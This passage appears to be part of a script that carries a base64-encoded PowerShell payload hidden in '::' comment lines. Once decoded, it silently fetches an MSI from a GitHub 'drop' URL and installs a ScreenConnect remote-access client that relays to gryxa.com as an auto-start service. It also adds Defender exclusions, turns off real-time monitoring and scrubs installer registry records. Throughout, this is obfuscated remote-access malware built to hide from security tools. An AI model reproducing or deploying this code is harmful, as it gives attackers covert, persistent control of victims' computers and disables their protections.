::bmdlcnByaW50KSIpKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgfQ0KICAgIHJldHVy
::biAkZmFsc2UNCn0NCg0KZnVuY3Rpb24gRmluZC1SdW5uaW5nR3J5eGFGcCB7DQog
::ICAgIyBMNDg6IE9OTFkgbm9uLXNldnJ6IFJ1bm5pbmcvUGVuZGluZyBXSVRIIGdy
::eXhhLmNvbSBJbWFnZVBhdGggKGJhcmUgc2MgY3JlYXRlIGlzIE5PVCBoZWFsdGh5
::KS4NCiAgICAkY2ZnID0gR2V0LUdyeXhhRnANCiAgICBpZiAoJGNmZyAtYW5kIChU
::ZXN0LVNjUnVubmluZyAkY2ZnKSAtYW5kIChUZXN0LVNjSGFzR3J5eGFSZWxheSAk
::Y2ZnKSAtYW5kICgkY2ZnIC1ub3RpbiAkc2NyaXB0OlNldnJ6S2VlcCkpIHsNCiAg
::ICAgICAgcmV0dXJuICRjZmcuVG9Mb3dlcigpDQogICAgfQ0KICAgIGlmICgkc2Ny
::aXB0OkdyeXhhRXhwZWN0ZWRGcCAtYW5kIChUZXN0LVNjUnVubmluZyAkc2NyaXB0
::OkdyeXhhRXhwZWN0ZWRGcCkgLWFuZCAoVGVzdC1TY0hhc0dyeXhhUmVsYXkgJHNj
::cmlwdDpHcnl4YUV4cGVjdGVkRnApKSB7DQogICAgICAgIHJldHVybiAkc2NyaXB0
::OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2VyKCkNCiAgICB9DQogICAgZm9yZWFjaCAo
::JHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
::KicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgIGlm
::ICgkc3ZjLlN0YXR1cyAtbm90aW4gQCgnUnVubmluZycsJ1N0YXJ0UGVuZGluZycs
::J0NvbnRpbnVlUGVuZGluZycpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgaWYgKCRz
::dmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScpIHsNCiAgICAgICAg
::ICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYg
::KCRmcCAtaW4gJHNjcmlwdDpTZXZyektlZXApIHsgY29udGludWUgfQ0KICAgICAg
::ICAgICAgaWYgKFRlc3QtU2NIYXNHcnl4YVJlbGF5ICRmcCkgeyByZXR1cm4gJGZw
::IH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0KZnVu
::Y3Rpb24gVGVzdC1BbnlOb25TZXZyelNjUnVubmluZyB7IHJldHVybiBbYm9vbF0o
::RmluZC1SdW5uaW5nR3J5eGFGcCkgfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFTdGF0
::dXMoW3N0cmluZ10kZnApIHsNCiAgICAkZXhpc3RzID0gVGVzdC1TY1NlcnZpY2VF
::eGlzdHMgJGZwDQogICAgJHJ1bm5pbmcgPSBUZXN0LVNjUnVubmluZyAkZnANCiAg
::ICAkcmVsYXkgPSBUZXN0LVNjSGFzR3J5eGFSZWxheSAkZnANCiAgICAkZGlyID0g
::VGVzdC1TY0RpciAkZnANCiAgICAkZ3VpZCA9IEZpbmQtUHJvZHVjdEd1aWQgJGZw
::DQogICAgJHRjcFIgPSAkdHJ1ZTsgJHRjcFUgPSAkdHJ1ZQ0KICAgIGlmICgkRGVl
::cCAtb3IgLW5vdCAoJHJ1bm5pbmcgLWFuZCAkcmVsYXkpKSB7DQogICAgICAgICR0
::Y3BSID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhUmVsYXlIb3N0IDQ0
::Mw0KICAgICAgICAkdGNwVSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4
::YVVpSG9zdCA0NDMNCiAgICB9DQogICAgIyBMNDg6IEhFQUxUSFkgb25seSB3aGVu
::IHJ1bm5pbmcgQU5EIEltYWdlUGF0aCBoYXMgZ3J5eGEuY29tDQogICAgaWYgKCRy
::dW5uaW5nIC1hbmQgJHJlbGF5KSB7IHJldHVybiAiSEVBTFRIWXwkZnB8cnVubmlu
::Zz0xfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgaWYgKCRydW5uaW5nIC1h
::bmQgLW5vdCAkcmVsYXkpIHsgcmV0dXJuICJCUk9LRU58JGZwfHJ1bm5pbmctbm8t
::cmVsYXl8cmVsYXk9JHRjcFJ8dWk9JHRjcFUiIH0NCiAgICBpZiAoJGV4aXN0cyAt
::YW5kICRyZWxheSkgeyByZXR1cm4gIkJST0tFTnwkZnB8c3ZjLXByZXNlbnQtc3Rv
::cHBlZHxyZWxheT0kdGNwUnx1aT0kdGNwVSIgfQ0KICAgIGlmICgkZXhpc3RzKSB7
::IHJldHVybiAiQlJPS0VOfCRmcHxzdmMtcHJlc2VudC1zdG9wcGVkfHJlbGF5PSR0
::Y3BSfHVpPSR0Y3BVIiB9DQogICAgaWYgKC1ub3QgJGV4aXN0cyAtYW5kICgkZGly
::IC1vciAkZ3VpZCkpIHsgcmV0dXJuICJTVFVDS3wkZnB8cmVnaXN0ZXJlZC1uby1z
::ZXJ2aWNlfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVIiB9DQogICAgcmV0dXJuICJBQlNF
::TlR8JGZwfG5vdC1pbnN0YWxsZWR8cmVsYXk9JHRjcFJ8dWk9JHRjcFUiDQp9DQoN
::CmZ1bmN0aW9uIFRlc3QtR3J5eGFIZWFsdGggew0KICAgICMgTDQ2OiBwcmVmZXIg
::YW55IGxpdmUgbm9uLXNldnJ6IFNDIG92ZXIgY2ZnIEV4cGVjdGVkRnAgKHdyb25n
::IEZQIGluIGdyeXhhLmNmZyB3YXMgZmFsc2UgRE9XTikuDQogICAgJGxpdmUgPSBG
::aW5kLVJ1bm5pbmdHcnl4YUZwDQogICAgaWYgKCRsaXZlKSB7DQogICAgICAgIFNl
::dC1Hcnl4YUZwICRsaXZlDQogICAgICAgIHJldHVybiAoR2V0LUdyeXhhU3RhdHVz
::ICRsaXZlKQ0KICAgIH0NCiAgICByZXR1cm4gKEdldC1Hcnl4YVN0YXR1cyAoR2V0
::LUdyeXhhRnApKQ0KfQ0KDQpmdW5jdGlvbiBDbGVhci1Hcnl4YUFycChbc3RyaW5n
::XSRmcCkgew0KICAgICRndWlkID0gRmluZC1Qcm9kdWN0R3VpZCAkZnANCiAgICBm
::b3JlYWNoICgkciBpbiBAKCdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93
::c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnLA0KICAgICAgICAgICAgICAgICAg
::ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dz
::XEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcpKSB7DQogICAgICAgIGlmICgkZ3Vp
::ZCAtYW5kIChUZXN0LVBhdGggIiRyXCRndWlkIikpIHsgUmVtb3ZlLUl0ZW0gLUxp
::dGVyYWxQYXRoICIkclwkZ3VpZCIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAkciAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsN
::CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAg
::ICAgICAgIGlmICgkZG4gLW1hdGNoICJTY3JlZW5Db25uZWN0IENsaWVudCBcKCQo
::W3JlZ2V4XTo6RXNjYXBlKCRmcCkpXCkiKSB7DQogICAgICAgICAgICAgICAgUmVt
::b3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRfLlBTUGF0aCAtUmVjdXJzZSAtRm9yY2Ug
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gVW5pbnN0YWxsLVNjRmluZ2Vy
::cHJpbnQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBpZiAoLW5vdCAkRmlu
::Z2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQ0KICAgICMgTDQ1OiBIQU5EUy1P
::RkYg4oCUIG5ldmVyIHVuaW5zdGFsbC9zdG9wL2RlbGV0ZSBBTlkgU2NyZWVuQ29u
::bmVjdA0KICAgIHJldHVybiAncmVmdXNlZC1oYW5kcy1vZmYtc2MnDQogICAgaWYg
::KFRlc3QtU2NSdW5uaW5nICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ3JlZnVzZWQt
::cnVubmluZycgfQ0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgk
::RmluZ2VycHJpbnQpIg0KICAgICRndWlkID0gRmluZC1Qcm9kdWN0R3VpZCAkRmlu
::Z2VycHJpbnQNCiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRXQVJFXFBv
::bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1T
::SSAvZiAyPiYxIHwgT3V0LU51bGwNCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNP
::RlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3Yg
::RGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwN
::CiAgICBpZiAoJGd1aWQpIHsgU3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJn
::dW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9UmVhbGx5
::U3VwcHJlc3MiIC1XYWl0IC1XaW5kb3dTdHlsZSBIaWRkZW47IFN0YXJ0LVNsZWVw
::IC1TZWNvbmRzIDYgfQ0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFt
::ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjKSB7
::ICYgc2MuZXhlIHN0b3AgJG5hbWUgMj4mMSB8IE91dC1OdWxsOyAmIHNjLmV4ZSBk
::ZWxldGUgJG5hbWUgMj4mMSB8IE91dC1OdWxsOyBTdGFydC1TbGVlcCAtU2Vjb25k
::cyAyIH0NCiAgICBDbGVhci1Hcnl4YUFycCAkRmluZ2VycHJpbnQNCiAgICBmb3Jl
::YWNoICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQ
::cm9ncmFtRmlsZXMpKSB7DQogICAgICAgICRkID0gSm9pbi1QYXRoICRiYXNlICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICAgICAgaWYg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsgJiB0YWtlb3duLmV4ZSAvRiAk
::ZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbDsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQ
::YXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZSB9DQogICAgfQ0KICAgIHJldHVybiAncmVtb3ZlZCcNCn0NCg0KZnVuY3Rp
::b24gVGVzdC1Nc2lQYWNrYWdlKFtzdHJpbmddJFBhdGgsIFtzdHJpbmddJEV4cGVj
::dGVkRnAgPSAnJykgew0KICAgICMgU2hhcmVkIE9MRS1tYWdpYyArIG9wdGlvbmFs
::IFByb2R1Y3ROYW1lIEZQIGdhdGUgKEwzNy9MMzkpLiBVc2VkIGJ5IEdyeXhhICsg
::c2V2cnogaW5zdGFsbCBwYXRocy4NCiAgICBpZiAoLW5vdCAkUGF0aCAtb3IgLW5v
::dCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkUGF0aCkpIHsgcmV0dXJuICRmYWxz
::ZSB9DQogICAgaWYgKChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJFBhdGgpLkxlbmd0
::aCAtbHQgNTAwMDAwKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIHRyeSB7DQogICAg
::ICAgICRmcyA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKChSZXNvbHZlLVBh
::dGggLUxpdGVyYWxQYXRoICRQYXRoKS5QYXRoKQ0KICAgICAgICAkbWFnaWMgPSBO
::ZXctT2JqZWN0IGJ5dGVbXSA0DQogICAgICAgICRudWxsID0gJGZzLlJlYWQoJG1h
::Z2ljLCAwLCA0KQ0KICAgICAgICAkZnMuQ2xvc2UoKQ0KICAgICAgICBpZiAoLW5v
::dCAoJG1hZ2ljWzBdIC1lcSAweEQwIC1hbmQgJG1hZ2ljWzFdIC1lcSAweENGIC1h
::bmQgJG1hZ2ljWzJdIC1lcSAweDExIC1hbmQgJG1hZ2ljWzNdIC1lcSAweEUwKSkg
::eyByZXR1cm4gJGZhbHNlIH0NCiAgICB9IGNhdGNoIHsgcmV0dXJuICRmYWxzZSB9
::DQogICAgaWYgKCRFeHBlY3RlZEZwKSB7DQogICAgICAgICRmcCA9IEdldC1GcEZy
::b21Qcm9kdWN0TmFtZSAoR2V0LU1zaVByb3BlcnR5ICRQYXRoICdQcm9kdWN0TmFt
::ZScpDQogICAgICAgIGlmICgtbm90ICRmcCAtb3IgJGZwIC1uZSAkRXhwZWN0ZWRG
::cC5Ub0xvd2VyKCkpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgfQ0KICAgIHJldHVy
::biAkdHJ1ZQ0KfQ0KDQpmdW5jdGlvbiBHZXQtR3J5eGFNc2kgew0KICAgICRtc2kg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ3BrZ19ncnl4YS5tc2knDQogICAgIyBXaGVu
::IGFuIEZQIGlzIHBpbm5lZCwgdGhlIGNhY2hlZCBNU0kgbXVzdCBtYXRjaCBpdDsg
::b3RoZXJ3aXNlIHJlZmV0Y2guDQogICAgaWYgKChUZXN0LVBhdGggJG1zaSkgLWFu
::ZCAoKEdldC1JdGVtICRtc2kpLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsNCiAgICAg
::ICAgaWYgKC1ub3QgJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgcmV0dXJuICRt
::c2kgfQ0KICAgICAgICBpZiAoVGVzdC1Nc2lQYWNrYWdlICRtc2kgJHNjcmlwdDpH
::cnl4YUV4cGVjdGVkRnApIHsgcmV0dXJuICRtc2kgfQ0KICAgICAgICBSZW1vdmUt
::SXRlbSAtTGl0ZXJhbFBhdGggJG1zaSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICB9DQogICAgJHRtcCA9IEpvaW4tUGF0aCAkZW52OlRF
::TVAgKCJzY19ncnl4YV97MH0ubXNpIiAtZiBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0
::cmluZygnTicpKQ0KICAgICMgTDMxOiBnaXRodWItZHJvcCBGSVJTVCAocmF3IHdv
::cmtzIGV2ZW4gd2hlbiB1aS5ncnl4YS5jb20gVExTIGlzIGJyb2tlbikuDQogICAg
::JHVybHMgPSBAKA0KICAgICAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
::bnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vcGtnX2dyeXhhLm1zaScs
::DQogICAgICAgICRzY3JpcHQ6R3J5eGFNc2lVcmwNCiAgICApDQogICAgJGN1cmwg
::PSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxjdXJsLmV4ZScN
::CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAkY3VybCA9ICdjdXJs
::LmV4ZScgfQ0KICAgIGZvcmVhY2ggKCR1IGluICR1cmxzKSB7DQogICAgICAgIHRy
::eSB7DQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgICAg
::ICYgJGN1cmwgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1
::IC0tbWF4LXRpbWUgMzAwIC1vICR0bXAgJHUgMj4mMSB8IE91dC1OdWxsDQogICAg
::ICAgICAgICBpZiAoKFRlc3QtUGF0aCAkdG1wKSAtYW5kICgoR2V0LUl0ZW0gJHRt
::cCkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgew0KICAgICAgICAgICAgICAgICRleHAg
::PSBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgJHNjcmlwdDpHcnl4YUV4
::cGVjdGVkRnAgfSBlbHNlIHsgJycgfQ0KICAgICAgICAgICAgICAgIGlmICgtbm90
::IChUZXN0LU1zaVBhY2thZ2UgJHRtcCAkZXhwKSkgeyBjb250aW51ZSB9DQogICAg
::ICAgICAgICAgICAgdHJ5IHsgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1E
::ZXN0aW5hdGlvbiAkbXNpIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU3RvcDsgcmV0dXJu
::ICRtc2kgfSBjYXRjaCB7IHJldHVybiAkdG1wIH0NCiAgICAgICAgICAgIH0NCiAg
::ICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICBpZiAoVGVzdC1QYXRoICR0bXAp
::IHsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0K
::ZnVuY3Rpb24gQWRkLVNjRGVmZW5kZXJFeGNsdXNpb24oW3N0cmluZ10kRnApIHsN
::CiAgICAjIEV4Y2x1ZGUgdGhpcyBGUCdzIFNDIGRpcnMgKHdpbGRjYXJkICsgZXhw
::bGljaXQpIHNvIFJUTSBjYW4ndCBxdWFyYW50aW5lIHRoZQ0KICAgICMgY2xpZW50
::IG9uIGluc3RhbGwuIFJlLWFzc2VydGVkIGJlZm9yZSBldmVyeSBpbnN0YWxsL21p
::Z3JhdGUg4oCUIHN1cnZpdmVzIEZQIHJvdGF0aW9ucy4NCiAgICB0cnkgew0KICAg
::ICAgICAkbmFtZXMgPSBAKCJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZwKSIsICdT
::Y3JlZW5Db25uZWN0IENsaWVudConKQ0KICAgICAgICBmb3JlYWNoICgkYmFzZSBp
::biBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMp
::KSB7DQogICAgICAgICAgICBpZiAoLW5vdCAkYmFzZSkgeyBjb250aW51ZSB9DQog
::ICAgICAgICAgICBmb3JlYWNoICgkbiBpbiAkbmFtZXMpIHsgQWRkLU1wUHJlZmVy
::ZW5jZSAtRXhjbHVzaW9uUGF0aCAoSm9pbi1QYXRoICRiYXNlICRuKSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgIH0NCiAgICAgICAgQWRk
::LU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAnU2NyZWVuQ29ubmVjdC5D
::bGllbnRTZXJ2aWNlLmV4ZScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUN
::CiAgICAgICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAnU2Ny
::ZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZScgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICAgICAgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJl
::YWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIH0gY2F0Y2gge30NCn0NCg0KZnVuY3Rpb24gQ29udmVydFRvLVBh
::Y2tlZEd1aWQoW3N0cmluZ10kR3VpZCkgew0KICAgICMgV2luZG93cyBJbnN0YWxs
::ZXIgc3RvcmVzIFByb2R1Y3RDb2RlcyB3aXRoIHJldmVyc2VkIHNlZ21lbnRzIChw
::YWNrZWQvc3F1aXNoZWQgR1VJRCkuDQogICAgJGcgPSAkR3VpZC5UcmltKCd7fScp
::LlJlcGxhY2UoJy0nLCAnJykNCiAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5U
::ZXh0LlN0cmluZ0J1aWxkZXINCiAgICAjIGZpcnN0IDMgc2VnbWVudHMgcmV2ZXJz
::ZWQgcGVyLWNoYXIsIGxhc3QgMiBzZWdtZW50cyByZXZlcnNlZCBwZXItYnl0ZS1w
::YWlyDQogICAgJHNlZ3MgPSBAKCRnLlN1YnN0cmluZygwLDgpLCAkZy5TdWJzdHJp
::bmcoOCw0KSwgJGcuU3Vic3RyaW5nKDEyLDQpLCAkZy5TdWJzdHJpbmcoMTYsNCks
::ICRnLlN1YnN0cmluZygyMCwxMikpDQogICAgZm9yICgkaT0wOyAkaSAtbHQgMzsg
::JGkrKykgeyAkYyA9ICRzZWdzWyRpXS5Ub0NoYXJBcnJheSgpOyBbYXJyYXldOjpS
::ZXZlcnNlKCRjKTsgW3ZvaWRdJHNiLkFwcGVuZCgtam9pbiAkYykgfQ0KICAgIGZv
::ciAoJGk9MzsgJGkgLWx0IDU7ICRpKyspIHsgJHMgPSAkc2Vnc1skaV07IGZvciAo
::JGo9MDsgJGogLWx0ICRzLkxlbmd0aDsgJGorPTIpIHsgW3ZvaWRdJHNiLkFwcGVu
::ZCgkc1skaisxXSk7IFt2b2lkXSRzYi5BcHBlbmQoJHNbJGpdKSB9IH0NCiAgICBy
::ZXR1cm4gJHNiLlRvU3RyaW5nKCkuVG9VcHBlcigpDQp9DQoNCmZ1bmN0aW9uIFJl
::bW92ZS1JbnN0YWxsZXJQcm9kdWN0UmVnaXN0cmF0aW9uKFtzdHJpbmddJFByb2R1
::Y3RDb2RlKSB7DQogICAgIyBQdXJnZSBhIHBoYW50b20vY29ycnVwdCBQcm9kdWN0
::Q29kZSBmcm9tIHRoZSBJbnN0YWxsZXIgZGF0YWJhc2UgKEluc3RhbGxlZD0wMDow
::MDowMA0KICAgICMgcmVnaXN0cmF0aW9ucyB0aGF0IHN1cnZpdmUgQVJQIHJlbW92
::YWwgYW5kIG1ha2UgL2kgZmFpbCAxNjAzIGluIG1haW50ZW5hbmNlIG1vZGUpLg0K
::ICAgIGlmICgtbm90ICRQcm9kdWN0Q29kZSkgeyByZXR1cm4gfQ0KICAgICRwYWNr
::ZWQgPSBDb252ZXJ0VG8tUGFja2VkR3VpZCAkUHJvZHVjdENvZGUNCiAgICAka2V5
::cyA9IEAoDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxDbGFzc2VzXEluc3RhbGxl
::clxQcm9kdWN0c1wkcGFja2VkIiwNCiAgICAgICAgIkhLTE06XFNPRlRXQVJFXE1p
::Y3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEluc3RhbGxlclxVc2VyRGF0
::YVxTLTEtNS0xOFxQcm9kdWN0c1wkcGFja2VkIiwNCiAgICAgICAgIkhLTE06XFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFs
::bFwkUHJvZHVjdENvZGUiLA0KICAgICAgICAiSEtMTTpcU09GVFdBUkVcV09XNjQz
::Mk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs
::XCRQcm9kdWN0Q29kZSINCiAgICApDQogICAgZm9yZWFjaCAoJGsgaW4gJGtleXMp
::IHsNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGspIHsgUmVt
::b3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRrIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgfQ0KICAgICYgcmVnLmV4ZSBk
::ZWxldGUgIkhLQ1JcSW5zdGFsbGVyXFByb2R1Y3RzXCRwYWNrZWQiIC9mIDI+JjEg
::fCBPdXQtTnVsbA0KfQ0KDQpmdW5jdGlvbiBTdGFydC1Hcnl4YUluc3RhbGwoW3N0
::cmluZ10kTXNpUGF0aCwgW3N0cmluZ10kRnAsIFtzdHJpbmddJExvZ0ZpbGUpIHsN
::CiAgICAjIEw0NDogbmV2ZXIgaW50ZXJydXB0IGFueSBsaXZlIEdyeXhhOyBuZXZl
::ciAvaSB3aGlsZSB0aGlzIEZQJ3Mgc2VydmljZSBleGlzdHM7IG5ldmVyIGRlZmVy
::cmVkIC94Lg0KICAgIGlmIChGaW5kLVJ1bm5pbmdHcnl4YUZwKSB7IHJldHVybiB9
::DQogICAgaWYgKCRGcCAtYW5kIChUZXN0LVNjUnVubmluZyAkRnApKSB7IHJldHVy
::biB9DQogICAgaWYgKCRGcCAtYW5kIChUZXN0LVNjU2VydmljZUV4aXN0cyAkRnAp
::KSB7DQogICAgICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRnAp
::Ig0KICAgICAgICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEg
::fCBPdXQtTnVsbA0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgQWRkLVNjRGVm
::ZW5kZXJFeGNsdXNpb24gJEZwDQogICAgJHNhZmVNc2kgPSBQcm90ZWN0LU1zaVNp
::YmxpbmdTYWZlICRNc2lQYXRoDQogICAgaWYgKC1ub3QgJHNhZmVNc2kpIHsgcmV0
::dXJuIH0gICMgcmVmdXNlIGluc3RhbGwgaWYgVXBncmFkZSBjYW5ub3QgYmUgY2xl
::YXJlZA0KICAgICRwYyA9IEdldC1Nc2lQcm9wZXJ0eSAkc2FmZU1zaSAnUHJvZHVj
::dENvZGUnDQogICAgJGNtZCA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfaW5z
::dGFsbC5jbWQnDQogICAgJHN2Y05hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQg
::KCRGcCkiDQogICAgJGxpbmVzID0gQCgnQGVjaG8gb2ZmJykNCiAgICAkbGluZXMg
::Kz0gJ3JlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdp
::bmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAw
::IC9mID5udWwgMj4mMScNCiAgICAjIEw0NCBydW50aW1lIGd1YXJkIGluIGRlZmVy
::cmVkIGNtZCDigJQgYWJvcnQgaWYgR3J5eGEgYXBwZWFyZWQgc2luY2Ugd3JhcHBl
::ciB3YXMgd3JpdHRlbg0KICAgICRsaW5lcyArPSAic2MgcXVlcnkgYCIkc3ZjTmFt
::ZWAiID5udWwgMj4mMSINCiAgICAkbGluZXMgKz0gJ2lmIG5vdCBlcnJvcmxldmVs
::IDEgKHNjIHN0YXJ0ICInICsgJHN2Y05hbWUgKyAnIiA+bnVsIDI+JjEgJiBleGl0
::IC9iIDApJw0KICAgICRsaW5lcyArPSAnc2MgcXVlcnkgc3RhdGU9IGFsbCB8IGZp
::bmRzdHIgL0kgL0M6IicgKyAkRnAgKyAnIiA+bnVsJw0KICAgICRsaW5lcyArPSAn
::aWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDAnDQogICAgIyBubyBtc2lleGVj
::IC94IGV2ZXIgaW4gZGVmZXJyZWQgd3JhcHBlciAoVE9DVE9VIGtpbGxlZCBsaXZl
::IEd1ZXN0KQ0KICAgIGlmICgkcGMpIHsNCiAgICAgICAgJGxpbmVzICs9ICJyZWcg
::ZGVsZXRlIGAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50
::VmVyc2lvblxVbmluc3RhbGxcJHBjYCIgL2YgPm51bCAyPiYxIg0KICAgICAgICAk
::bGluZXMgKz0gInJlZyBkZWxldGUgYCJIS0xNXFNPRlRXQVJFXFdPVzY0MzJOb2Rl
::XE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwkcGNg
::IiAvZiA+bnVsIDI+JjEiDQogICAgfQ0KICAgICRsaW5lcyArPSAibXNpZXhlYyAv
::aSBgIiRzYWZlTXNpYCIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9
::UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRMb2dGaWxlYCIiDQogICAgJGxpbmVzICs9
::ICJzYyBjb25maWcgYCIkc3ZjTmFtZWAiIHN0YXJ0PSBhdXRvIg0KICAgICRsaW5l
